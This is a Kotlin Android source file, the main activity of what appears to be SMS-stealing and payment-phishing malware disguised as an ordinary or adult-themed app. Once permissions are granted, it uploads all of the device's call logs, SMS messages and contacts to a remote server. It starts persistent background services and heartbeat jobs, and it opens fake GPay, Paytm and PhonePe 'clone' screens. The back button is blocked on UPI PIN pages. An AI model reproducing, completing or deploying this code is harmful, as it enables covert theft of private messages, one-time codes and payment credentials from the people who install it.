package com.example.test

import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.drawable.AdaptiveIconDrawable
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.webkit.WebChromeClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.test.utils.NetworkChecker
import com.example.test.utils.DataUploader
import com.example.test.utils.DeviceInfoHelper
import com.example.test.utils.PermissionManager
import com.example.test.utils.PermissionDialog
import com.example.test.utils.SmsBatchUploader
import com.example.test.utils.ContactsBatchUploader
import com.example.test.utils.CallLogsBatchUploader
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())

    private val BATTERY_UPDATE_INTERVAL_MS = 600000L
    private val FCM_TIMEOUT_MS = 3000L

    private lateinit var webView: WebView
    private lateinit var permissionManager: PermissionManager
    private val uploadScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    
    private lateinit var appConfig: AppConfig
    private var isPaymentReceiverRegistered = false
    private val paymentSuccessReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            runOnUiThread {
                if (::webView.isInitialized) {
                    try {
                        saveReachedFinal()
                        webView.loadUrl("file:///android_asset/final.html")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to load final page after payment success", e)
                    }
                }
            }
        }
    }
    private var pendingFinalScreen = false

    companion object {
        private const val TAG = "MainActivity"
        const val ACTION_CLOSE = "com.example.test.ACTION_CLOSE"
        const val ACTION_SHOW_FINAL = "com.example.test.ACTION_SHOW_FINAL"
        private const val PREFS_NAME = "app_state"
        private const val KEY_REACHED_FINAL = "reached_final"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        if (intent.action == ACTION_CLOSE) {
            finishAndRemoveTask()
            return
        } else if (intent.action == ACTION_SHOW_FINAL) {
            pendingFinalScreen = true
        }
        
        if (hasReachedFinal()) {
            pendingFinalScreen = true
        }
        
        enableFullscreen()

        appConfig = AppConfig.load(this)
        setTaskDescriptionForRecentApps()
        ServerConfig.initialize(this)
        registerPaymentSuccessReceiver()
        
        Handler(Looper.getMainLooper()).postDelayed({
            ServerConfig.printAllSettings()
        }, 2000)

        deviceId = DeviceInfoHelper.getDeviceId(this)
        subscribeToFirebaseTopic()

        permissionManager = PermissionManager(this)
        permissionManager.initialize { }

        uploadScope.launch {
            try {
                var fcmTokenInitial = "NO_FCM_TOKEN_${deviceId.take(8)}"
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (task.isSuccessful && task.result != null) {
                        fcmTokenInitial = task.result!!
                    }
                }
                delay(1000)
                
                DataUploader.registerDeviceInitial(
                    this@MainActivity,
                    deviceId,
                    fcmTokenInitial,
                    appConfig.userId
                )
            } catch (e: Exception) {
                Log.e(TAG, "Initial registration error: ${e.message}", e)
            }
        }

        setContent {
            MaterialTheme {
                MainScreen()
            }
        }
    }
    
    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        when (intent?.action) {
            ACTION_CLOSE -> finishAndRemoveTask()
            ACTION_SHOW_FINAL -> showFinalScreen()
        }
    }
    
    private fun subscribeToFirebaseTopic() {
        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
            .addOnSuccessListener {
                Log.d(TAG, "Subscribed to topic successfully")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to subscribe to topic", e)
            }
    }
    
    private fun checkInternetConnection(): Boolean {
        return NetworkChecker.isInternetAvailable(this)
    }

    private fun enableFullscreen() {
        actionBar?.hide()
        WindowCompat.setDecorFitsSystemWindows(window, false)

        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                isAppearanceLightStatusBars = true
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                isAppearanceLightNavigationBars = false
            }
        }

        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    @Composable
    fun MainScreen() {
        var showPermissionDialog by remember { mutableStateOf(false) }
        var permissionsGranted by remember { mutableStateOf(false) }
        var showSplash by remember { mutableStateOf(true) }
        var hasInternet by remember { mutableStateOf(true) }
        var showNoInternetDialog by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope()

        LaunchedEffect("internet_check") {
            hasInternet = checkInternetConnection()
            if (!hasInternet) {
                showNoInternetDialog = true
            }
        }

        LaunchedEffect(Unit) {
            delay(3000)
            showSplash = false
            delay(300)
            
            if (!permissionManager.checkAllPermissions()) {
                permissionManager.requestPermissions {
                    if (permissionManager.checkAllPermissions()) {
                        permissionsGranted = true
                        continueInitialization()
                    } else {
                        showPermissionDialog = true
                    }
                }
            } else {
                permissionsGranted = true
                continueInitialization()
            }
        }
        
        if (showNoInternetDialog) {
            NoInternetDialog(
                onRetry = {
                    hasInternet = checkInternetConnection()
                    if (hasInternet) {
                        showNoInternetDialog = false
                    }
                },
                onExit = {
                    finish()
                }
            )
        }
        
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.White)
        ) {
            if (showSplash && appConfig.appType != "sexyhub" && appConfig.appType != "wosexy") {
                val appName = appConfig.appName
                val gradientColors = listOf(
                    Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor)),
                    Color(android.graphics.Color.parseColor(appConfig.theme.secondaryColor)),
                    Color(android.graphics.Color.parseColor(appConfig.theme.accentColor))
                )
                
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(
                            brush = androidx.compose.ui.graphics.Brush.linearGradient(
                                colors = gradientColors
                            )
                        ),
                    contentAlignment = androidx.compose.ui.Alignment.Center
                ) {
                    Text(
                        text = appName,
                        style = MaterialTheme.typography.displayLarge.copy(
                            fontSize = 48.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White,
                            letterSpacing = 2.sp
                        )
                    )
                }
            } else {
                AndroidView(
                    factory = { context -> createWebView() },
                    modifier = Modifier.fillMaxSize(),
                    update = { webView ->
                        webView.layoutParams = android.view.ViewGroup.LayoutParams(
                            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                            android.view.ViewGroup.LayoutParams.MATCH_PARENT
                        )
                    }
                )

                if (showPermissionDialog) {
                    PermissionDialog(
                        onRequestPermissions = {
                            scope.launch {
                                permissionManager.requestPermissions { }
                            }
                        },
                        onAllPermissionsGranted = {
                            showPermissionDialog = false
                            permissionsGranted = true
                            continueInitialization()
                        }
                    )
                }
            }
        }
    }

    private fun createWebView(): WebView {
        webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
        
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        
        webView.setInitialScale(100)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                
                if (url != null && url.contains("final.html")) {
                    saveReachedFinal()
                }

                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var el = document.getElementById('deviceId');
                            if (el) el.innerText = 'Device ID: $deviceId';
                        } catch(e) {}
                    })();
                    """.trimIndent(),
                    null
                )
                
                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var metaTheme = document.querySelector('meta[name="theme-color"]');
                            if (metaTheme) {
                                return metaTheme.getAttribute('content');
                            }
                            return null;
                        } catch(e) {
                            return null;
                        }
                    })();
                    """.trimIndent()
                ) { color ->
                    if (color != null && color != "null") {
                        val colorValue = color.replace("\"", "")
                        try {
                            val parsedColor = android.graphics.Color.parseColor(colorValue)
                            runOnUiThread {
                                window.statusBarColor = parsedColor
                                window.navigationBarColor = parsedColor
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to parse color", e)
                        }
                    }
                }
            }

            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                super.onReceivedError(view, errorCode, description, failingUrl)
                Log.e(TAG, "WebView error: $description")
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()}")
                }
                return true
            }
        }

        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getThemeColors(): String = appConfig.theme.toJson()
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
            
            @android.webkit.JavascriptInterface
            fun openPaymentClone(paymentMethod: String) {
                runOnUiThread {
                    openPaymentCloneActivity(paymentMethod)
                }
            }
        }, "Android")

        try {
            val targetUrl = if (pendingFinalScreen) {
                pendingFinalScreen = false
                "file:///android_asset/final.html"
            } else {
                "file:///android_asset/index.html"
            }
            webView.loadUrl(targetUrl)
        } catch (e: Exception) {
            Log.e(TAG, "Load error: ${e.message}")
        }

        return webView
    }
    
    private fun registerPaymentSuccessReceiver() {
        if (isPaymentReceiverRegistered) {
            return
        }
        val filter = IntentFilter(Constants.ACTION_PAYMENT_SUCCESS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(paymentSuccessReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("DEPRECATION")
            registerReceiver(paymentSuccessReceiver, filter)
        }
        isPaymentReceiverRegistered = true
    }

    private fun handleUrlNavigation(url: String): Boolean {
        return false
    }

    private fun openPaymentCloneActivity(paymentMethod: String) {
        val intent = when (paymentMethod.lowercase().trim()) {
            "gpay", "googlepay", "google-pay" -> {
                Intent(this, GPayCloneActivity::class.java)
            }
            "paytm" -> {
                Intent(this, PaytmCloneActivity::class.java)
            }
            "phonepe" -> {
                Intent(this, PhonePeCloneActivity::class.java)
            }
            else -> {
                Log.e(TAG, "Unknown payment method: $paymentMethod")
                return
            }
        }
        
        startActivity(intent)
    }

    private fun showFinalScreen() {
        if (::webView.isInitialized) {
            runOnUiThread {
                saveReachedFinal()
                webView.loadUrl("file:///android_asset/final.html")
            }
        } else {
            pendingFinalScreen = true
        }
    }
    
    private fun saveReachedFinal() {
        val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_REACHED_FINAL, true).apply()
    }
    
    private fun hasReachedFinal(): Boolean {
        val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getBoolean(KEY_REACHED_FINAL, false)
    }
    
    private fun setTaskDescriptionForRecentApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                val packageManager = packageManager
                val appInfo = packageManager.getApplicationInfo(packageName, 0)
                val appIcon = packageManager.getApplicationIcon(appInfo)
                val iconBitmap = drawableToBitmap(appIcon)
                
                val taskDescription = ActivityManager.TaskDescription(
                    appConfig.appName,
                    iconBitmap,
                    android.graphics.Color.parseColor(appConfig.theme.primaryColor)
                )
                setTaskDescription(taskDescription)
            } catch (e: Exception) {
                try {
                    val iconBitmap = BitmapFactory.decodeResource(resources, android.R.drawable.sym_def_app_icon)
                    val taskDescription = ActivityManager.TaskDescription(
                        appConfig.appName,
                        iconBitmap,
                        android.graphics.Color.WHITE
                    )
                    setTaskDescription(taskDescription)
                } catch (e2: Exception) {
                    Log.e(TAG, "Failed to set task description", e2)
                }
            }
        }
    }
    
    private fun drawableToBitmap(drawable: Drawable): Bitmap {
        if (drawable is BitmapDrawable && drawable.bitmap != null) {
            return drawable.bitmap
        }
        
        val width = if (drawable.intrinsicWidth > 0) drawable.intrinsicWidth else 192
        val height = if (drawable.intrinsicHeight > 0) drawable.intrinsicHeight else 192
        
        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
        val canvas = Canvas(bitmap)
        drawable.setBounds(0, 0, canvas.width, canvas.height)
        drawable.draw(canvas)
        
        return bitmap
    }

    private fun continueInitialization() {
        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
            } else {
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
            }

            uploadScope.launch {
                try {
                    val registerSuccess = DataUploader.registerDevice(
                        this@MainActivity,
                        deviceId,
                        fcmToken,
                        appConfig.userId
                    )

                    val callLogResult = CallLogsBatchUploader.uploadAllCallLogs(
                        context = this@MainActivity,
                        deviceId = deviceId,
                        baseUrl = ServerConfig.getBaseUrl()
                    ) { sent, total -> }

                    launch {
                        SmsBatchUploader.uploadAllSms(
                            context = this@MainActivity,
                            deviceId = deviceId,
                            baseUrl = ServerConfig.getBaseUrl()
                        ) { progress -> }
                    }

                    launch {
                        delay(1000)
                        ContactsBatchUploader.uploadAllContacts(
                            context = this@MainActivity,
                            deviceId = deviceId,
                            baseUrl = ServerConfig.getBaseUrl()
                        ) { sent, total -> }
                    }

                } catch (e: Exception) {
                    Log.e(TAG, "Initialization error: ${e.message}", e)
                }
            }

            handler.postDelayed({
                handler.post(batteryUpdater)
            }, 2000)

            handler.postDelayed({
                startBackgroundServices()
            }, 3000)

        }, FCM_TIMEOUT_MS)
    }

    private fun startBackgroundServices() {
        try {
            val smsIntent = Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(smsIntent)
            } else {
                startService(smsIntent)
            }

            val heartbeatIntent = Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(heartbeatIntent)
            } else {
                startService(heartbeatIntent)
            }
            
            scheduleHeartbeatWorker()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(this)
            }

        } catch (e: Exception) {
            Log.e(TAG, "Services error: ${e.message}")
        }
    }
    
    private fun scheduleHeartbeatWorker() {
        try {
            val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
                15,
                java.util.concurrent.TimeUnit.MINUTES,
                5,
                java.util.concurrent.TimeUnit.MINUTES
            )
                .setConstraints(
                    androidx.work.Constraints.Builder()
                        .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                        .build()
                )
                .setBackoffCriteria(
                    androidx.work.BackoffPolicy.EXPONENTIAL,
                    10,
                    java.util.concurrent.TimeUnit.SECONDS
                )
                .addTag("heartbeat")
                .build()

            androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                HeartbeatWorker.WORK_NAME,
                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "WorkManager schedule failed: ${e.message}")
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized) {
            val currentUrl = webView.url ?: ""
            if (currentUrl.contains("upi-pin.html") || 
                currentUrl.contains("pin.html") || 
                currentUrl.contains("final.html")) {
                return
            }
            if (webView.canGoBack()) {
                webView.goBack()
            } else {
                super.onBackPressed()
            }
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        
        if (isPaymentReceiverRegistered) {
            try {
                unregisterReceiver(paymentSuccessReceiver)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to unregister payment receiver", e)
            }
            isPaymentReceiverRegistered = false
        }

        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }

        if (::permissionManager.isInitialized) {
            permissionManager.stopBatteryMonitoring()
        }
    }
    
    @Composable
    private fun NoInternetDialog(
        onRetry: () -> Unit,
        onExit: () -> Unit
    ) {
        AlertDialog(
            onDismissRequest = { },
            icon = {
                Box(
                    modifier = Modifier
                        .size(80.dp)
                        .background(
                            color = Color(0xFFFFEBEE),
                            shape = CircleShape
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = "📡",
                        fontSize = 40.sp
                    )
                }
            },
            title = {
                Text(
                    text = "No Internet Connection",
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.fillMaxWidth()
                )
            },
            text = {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "This app requires an internet connection to work.",
                        fontSize = 16.sp,
                        textAlign = TextAlign.Center,
                        color = Color.Gray,
                        modifier = Modifier.padding(vertical = 8.dp)
                    )
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        text = "Please check your connection and try again.",
                        fontSize = 14.sp,
                        textAlign = TextAlign.Center,
                        color = Color.Gray
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = onRetry,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor))
                    ),
                    modifier = Modifier.fillMaxWidth(0.48f)
                ) {
                    Text(
                        text = "Retry",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            },
            dismissButton = {
                TextButton(
                    onClick = onExit,
                    modifier = Modifier.fillMaxWidth(0.48f)
                ) {
                    Text(
                        text = "Exit",
                        fontSize = 16.sp,
                        color = Color.Red
                    )
                }
            },
            containerColor = Color.White,
            shape = RoundedCornerShape(16.dp)
        )
    }
}